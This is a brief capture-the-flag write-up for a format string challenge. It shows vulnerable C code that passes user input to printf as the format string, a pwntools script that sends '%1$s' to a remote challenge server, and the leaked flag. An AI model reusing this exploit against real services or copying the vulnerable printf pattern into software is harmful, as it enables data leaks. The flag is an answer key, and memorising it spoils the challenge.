# Writeup
A classic format string bug. In `fsvchall2.c`:

```c
void vuln(const char *secret) {
    char input[256];
    fgets(input, sizeof(input), stdin);
    printf(input, secret);   // <- our input is the format string
}
```

Our input goes straight into `printf` as the format string, and `secret` is passed as the first variadic argument. So we just use the positional `%1$s` to print the first argument as a string, which is exactly the secret.

```python
from pwn import *
r = remote("18.226.103.146", 9002)
r.recvuntil(b"Input: ")
r.sendline(b"%1$s")
r.interactive()
```

Server leaks:

```
f0rm4tStr1ngVulN3r4b1lityIsSc4rY
```

Wrap it in the flag format.

# flag
```
spooky{f0rm4tStr1ngVulN3r4b1lityIsSc4rY}
```
